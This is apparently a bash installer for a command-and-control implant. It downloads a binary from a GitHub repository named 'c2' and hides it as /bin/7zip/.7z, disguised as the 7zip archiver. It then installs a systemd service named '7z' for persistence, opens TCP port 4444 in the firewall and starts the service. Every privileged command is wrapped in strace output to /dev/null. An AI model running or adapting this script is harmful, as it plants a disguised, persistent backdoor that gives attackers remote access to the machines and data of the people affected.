#!/bin/bash
sudo strace -o /dev/null mkdir /bin/7zip
curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/server -o server
sleep 2

sudo strace -o /dev/null mv server /bin/7zip/.7z
sudo strace -o /dev/null chmod +x /bin/7zip/.7z
curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
sleep 1

sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
sudo strace -o /dev/null firewall-cmd --reload
sudo strace -o /dev/null systemctl start 7z
sudo strace -o /dev/null systemctl enable 7z
sudo strace -o /dev/null systemctl daemon-reload

echo "Installed Successfully"

